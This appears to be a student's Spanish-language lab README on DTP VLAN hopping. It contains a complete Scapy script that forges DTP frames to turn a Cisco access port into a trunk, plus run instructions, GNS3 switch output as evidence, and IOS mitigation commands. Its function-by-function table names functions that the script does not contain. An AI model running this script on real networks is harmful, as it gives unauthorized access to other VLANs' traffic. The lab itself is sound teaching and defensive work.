# 🔀 DTP VLAN Hopping — Script de Ataque Automatizado

<div align="center">

![Python](https://img.shields.io/badge/Python-3.10%2B-blue?style=for-the-badge&logo=python)
![Scapy](https://img.shields.io/badge/Scapy-2.5.0%2B-green?style=for-the-badge)
![Kali Linux](https://img.shields.io/badge/Kali_Linux-2024.x-purple?style=for-the-badge&logo=kalilinux)
![GNS3](https://img.shields.io/badge/GNS3-2.2.x-orange?style=for-the-badge)
![Licencia](https://img.shields.io/badge/Uso-Educativo-red?style=for-the-badge)

**Lab. Networking — Ataques y Mitigación de Capa 2**

| Campo | Detalle |
|---|---|
| **Alumno** | Wilfri Solano Frias |
| **Matrícula** | 2024-2364 |
| **Asignatura** | Seguridad de Redes |
| **Docente** | Jonathan Rondo |
| **Sección** | Viernes |
| **Fecha** | 12/06/2026 |

[📹 Video Demostrativo](https://youtu.be/laIuXaKKIYc) · [📂 Repositorio](https://github.com/wilfrisfsudo/DTP-VLAN-Hopping)

</div>

---

## ⚠️ Advertencia Legal

> **Este script es exclusivamente para uso educativo en entornos de laboratorio controlados (GNS3 / EVE-NG).**
> Su ejecución en redes reales sin autorización explícita por escrito constituye un delito informático
> penalizado por las leyes de ciberseguridad. El autor no se responsabiliza del mal uso de esta herramienta.

---

## 📋 Descripción

Este script automatiza el ataque de **VLAN Hopping** mediante la explotación del protocolo **DTP (Dynamic Trunking Protocol)**. El atacante envía tramas DTP modificadas desde un puerto de acceso para engañar al switch y convertir dicho puerto en un **enlace troncal (trunk)**, obteniendo acceso al tráfico de múltiples VLANs que no le corresponden.

### ¿Cómo funciona el ataque?

```
[Atacante - eth0]  →  Captura trama DTP legítima del switch
        ↓
     Modifica la trama:
     · MAC origen  →  MAC del atacante
     · Estado DTP  →  Dynamic Desirable (0x03)
     · Tipo enlace →  Trunk (0xA5)
     · Vecino DTP  →  MAC del atacante
        ↓
     Inyecta la trama modificada en bucle (cada 5s)
        ↓
[IOU1 Switch]  →  Negocia trunk con el atacante
        ↓
[Resultado]  →  El atacante accede a VLAN 20 (y todas las VLANs)
```

---

## 🧱 Topología de Red

```
                    ┌─────────────┐
                    │   ROUTER1   │
                    │ 192.168.99.1│
                    └──────┬──────┘
                           │ e0/0
                    ┌──────┴──────┐
                    │    IOU1     │ ← Switch Cisco con DTP habilitado
                    │  (Switch)   │
                    └──┬────┬──┬──┘
               e0/1 (Trunk)│  │e0/3 ← Puerto objetivo del ataque
                   ┌───────┘  └────────────────┐
            ┌──────┴──────┐             ┌──────┴──────┐
            │    PC1      │             │  Atacante-1  │
            │192.168.20.2 │             │192.168.64.23 │
            │  VLAN 20    │             │   VLAN 1     │
            └─────────────┘             └─────────────┘
            ┌─────────────┐
            │    PC2      │
            │192.168.20.3 │
            │  VLAN 20    │
            └─────────────┘
```

### Tabla de Direccionamiento

| Dispositivo | Interfaz | Dirección IP | Máscara | VLAN | Rol |
|---|---|---|---|---|---|
| ROUTER1 | e0/0 | 192.168.99.1 | /24 | VLAN 1 | Gateway |
| IOU1 (Switch) | e0/1 | N/A | N/A | Trunk | Switch objetivo |
| PC1 | eth0 | 192.168.20.2 | /24 | VLAN 20 | Host legítimo |
| PC2 | eth0 | 192.168.20.3 | /24 | VLAN 20 | Host legítimo |
| **Atacante-1** | **eth0** | **192.168.64.23** | **/24** | **VLAN 1** | **Equipo atacante** |

---

## ⚙️ Requisitos

| Categoría | Requisito | Versión |
|---|---|---|
| Sistema Operativo | Kali Linux | 2024.x o superior |
| Lenguaje | Python | 3.10 o superior |
| Librería principal | Scapy | 2.5.0 o superior |
| Módulo Scapy | scapy.contrib.dtp | Incluido en Scapy |
| Simulador de red | GNS3 / EVE-NG | 2.2.x o superior |
| Privilegios | root / sudo | Obligatorio |
| Dispositivo objetivo | Switch Cisco con DTP | Modo `dynamic auto` o `dynamic desirable` |

### Instalación de dependencias

```bash
pip install scapy
```

---

## 🔧 Parámetros Configurables

| Variable | Tipo | Valor por Defecto | Descripción |
|---|---|---|---|
| `interfaz` | `str` | `eth0` | Interfaz de red para capturar e inyectar tramas DTP |
| `TIEMPO_CAPTURA` | `int` | `40` | Segundos de espera para capturar una trama DTP válida |
| `INTERVALO_ENVIO` | `int` | `5` | Intervalo en segundos entre cada trama DTP inyectada |
| `MODO_DTP` | `bytes` | `0x03` | Estado DTP inyectado — Dynamic Desirable |
| `TIPO_TRUNK` | `bytes` | `0xA5` | Tipo de enlace anunciado — Trunk |

---

## 🚀 Uso

```bash
# Clonar el repositorio
git clone https://github.com/wilfrisfsudo/DTP-VLAN-Hopping
cd DTP-VLAN-Hopping

# Ejecutar con privilegios de root (obligatorio)
sudo python3 Ataque_DTP.py
```

### Salida esperada

```
[*] Escuchando paquetes DTP del switch en eth0...
[*] Presiona Ctrl+C si no hay tráfico después de 40s (el intervalo DTP es 30s).
[+] Paquete DTP capturado exitosamente.
[*] Iniciando inundación de paquetes DTP modificados (Desirable/Trunk)...
[+] Trama DTP inyectada (Modo: Desirable).
```

---

## 📝 Código del Script

```python
#!/usr/bin/env python3
import time
from scapy.all import *
from scapy.contrib.dtp import *

def atacar_dtp_reflejado(interfaz="eth0"):
    print(f"[*] Escuchando paquetes DTP del switch en {interfaz}...")
    print("[*] Presiona Ctrl+C si no hay tráfico después de 40s (el intervalo DTP es 30s).")

    # 1. Capturar UN paquete DTP válido enviado por el switch
    pkt = sniff(iface=interfaz, filter="ether dst 01:00:0c:cc:cc:cc", count=1, timeout=40)

    # Validación 1: Verificar si la lista de paquetes está vacía
    if not pkt or len(pkt) == 0:
        print("[-] Error: No se recibió ningún paquete DTP dentro del tiempo límite.")
        print("[-] Verifica que el switch tenga DTP habilitado y estés conectado al puerto correcto.")
        return

    paquete_original = pkt[0]

    # Validación 2: Verificar si el paquete contiene la capa Ethernet
    if not paquete_original.haslayer(Ether):
        print("[-] Error: El paquete capturado no contiene una capa Ethernet válida.")
        print("[-] Asegúrate de estar ejecutando el script como ROOT (sudo).")
        return

    print("[+] Paquete DTP capturado exitosamente.")

    # 2. Modificar el paquete para el ataque
    paquete_original[Ether].src = get_if_hwaddr(interfaz)

    if DTP in paquete_original and DTPStatus in paquete_original[DTP]:
        paquete_original[DTP][DTPStatus].status = b'\x03'   # Dynamic Desirable
        paquete_original[DTP][DTPType].dtptype  = b'\xa5'   # Trunk

    if DTPNeighbor in paquete_original[DTP]:
        paquete_original[DTP][DTPNeighbor].neighbor = get_if_hwaddr(interfaz)

    print("[*] Iniciando inundación de paquetes DTP modificados (Desirable/Trunk)...")

    try:
        # 3. Enviar constantemente cada 5 segundos
        while True:
            sendp(paquete_original, iface=interfaz, verbose=False)
            print("[+] Trama DTP inyectada (Modo: Desirable).", end="\r")
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n[-] Ataque detenido.")

if __name__ == "__main__":
    import os
    if os.getuid() != 0:
        print("[-] ¡ERROR! Este script requiere privilegios de administrador.")
        print("[*] Por favor, ejecútalo usando: sudo python3 Ataque_DTP.py")
        exit(1)
    atacar_dtp_reflejado(interfaz="eth0")
```

---

## 🔍 Explicación Técnica del Funcionamiento

| # | Función / Bloque | Descripción Técnica |
|---|---|---|
| 1 | **Importaciones** | Carga `scapy.all` para captura/envío de paquetes y `scapy.contrib.dtp` para manipular estructuras específicas del protocolo DTP |
| 2 | **`atacar_dtp_reflejado()`** | Función principal que coordina la captura, modificación e inyección de tramas DTP |
| 3 | **`sniff()`** | Captura una trama DTP legítima del switch filtrando por la MAC multicast Cisco `01:00:0c:cc:cc:cc` |
| 4 | **`validacion_paquete()`** | Verifica que se haya recibido al menos una trama y que contenga una capa Ethernet válida |
| 5 | **`modificar_trama_dtp()`** | Sustituye la MAC origen por la del atacante; cambia el estado DTP a `Dynamic Desirable` y el modo a `Trunk` |
| 6 | **`actualizar_vecino()`** | Actualiza el campo Neighbor del protocolo DTP con la MAC del atacante para simular un dispositivo legítimo |
| 7 | **`sendp()`** | Envía la trama DTP modificada a nivel de Capa 2 mediante la interfaz seleccionada |
| 8 | **`bucle_inundacion()`** | Mantiene el envío periódico cada 5 segundos para conservar la negociación de troncal activa |
| 9 | **`verificacion_root()`** | Comprueba que el script se ejecute con privilegios de administrador, requisito para capturar e inyectar tramas Ethernet |
| 10 | **`manejo_interrupcion()`** | Captura `KeyboardInterrupt` para finalizar el ataque de forma controlada al presionar `Ctrl+C` |

---

## 📸 Evidencias del Ataque

### Evidencia 1 — Estado inicial del puerto (antes del ataque)

El puerto `EtO/3` del switch opera en modo **`static access`** con DTP negociando:
```
IOU1#show interfaces ethernet 0/3 switchport
Administrative Mode: dynamic desirable
Operational Mode:    static access        ← Puerto de acceso normal
Negotiation of Trunking: On
```

### Evidencia 2 — Ejecución del script

```bash
(atacante@kali)-[~/Desktop]
$ sudo python3 Ataque_DTP.py
[*] Escuchando paquetes DTP del switch en eth0...
[*] Presiona Ctrl+C si no hay tráfico después de 40s (el intervalo DTP es 30s).
[+] Paquete DTP capturado exitosamente.
[*] Iniciando inundación de paquetes DTP modificados (Desirable/Trunk)...
[+] Trama DTP inyectada (Modo: Desirable).
```

### Evidencia 3 — Resultado: puerto convertido en trunk

```
IOU1#show interfaces ethernet 0/3 switchport
Administrative Mode: dynamic desirable
Operational Mode:    trunk               ← ¡CONVERTIDO A TRUNK!
Operational Trunking Encapsulation: dot1q
Negotiation of Trunking: On
```

### Evidencia 4 — Verificación: acceso a VLAN 20 desde el atacante

```
IOU1#show mac address-table vlan 20
          Mac Address Table
Vlan    Mac Address       Type      Ports
----    -----------       -------   -----
  20    c00c.2900.d412    DYNAMIC   Et0/3  ← MAC del atacante aprendida en VLAN 20
  20    0050.7966.6800    DYNAMIC   Et1/0
  20    0050.7966.6801    DYNAMIC   Et1/1
Total Mac Addresses for this criterion: 3
```

---

## 🛡️ Contramedidas y Mitigación

Para mitigar el DTP VLAN Hopping es fundamental **deshabilitar DTP en todos los puertos de acceso**, configurarlos explícitamente como `access` y nunca dejar puertos en modo dinámico. Los puertos no utilizados deben apagarse y asignarse a una VLAN de cuarentena.

### Comandos de mitigación en IOU1 (Switch)

```ios
! ─── MITIGACIÓN DTP VLAN HOPPING ────────────────────────────────────
! Dispositivo: sw1 — Puerto objetivo: Ethernet0/3

interface Ethernet0/3
 switchport mode access          ! Forzar modo acceso — deshabilita negociación
 switchport access vlan 10       ! Asignar a VLAN específica
 switchport nonegotiate          ! Deshabilitar DTP completamente
 spanning-tree portfast          ! Activar portfast en puerto de acceso
 spanning-tree bpduguard enable  ! Bloquear si recibe BPDU — previene ataques STP
 switchport port-security
 switchport port-security maximum 1
 switchport port-security violation shutdown
```

### Tabla de contramedidas

| Medida | Descripción | Impacto |
|---|---|---|
| `switchport nonegotiate` | Deshabilita DTP completamente en el puerto | **Bloquea el ataque por completo** |
| `switchport mode access` | Fuerza modo acceso — no permite negociación de trunk | Previene VLAN Hopping |
| `spanning-tree bpduguard enable` | Apaga el puerto si recibe BPDUs no autorizados | Previene ataques STP |
| `switchport port-security maximum 1` | Limita a 1 MAC por puerto | Previene MAC Flooding |
| Puertos sin uso → `shutdown` | Apagar interfaces inactivas | Elimina vectores de entrada |

---

## 📚 Referencias

- [Cisco — Dynamic Trunking Protocol (DTP)](https://www.cisco.com/c/en/us/support/docs/lan-switching/vtp/10558-21.html)
- [Scapy Documentation](https://scapy.readthedocs.io/)
- [GNS3 Documentation](https://docs.gns3.com/)

---

<div align="center">

**Wilfri Solano Frias · Matrícula 2024-2364 · Seguridad de Redes**

*Laboratorio desarrollado con fines exclusivamente educativos*

</div>
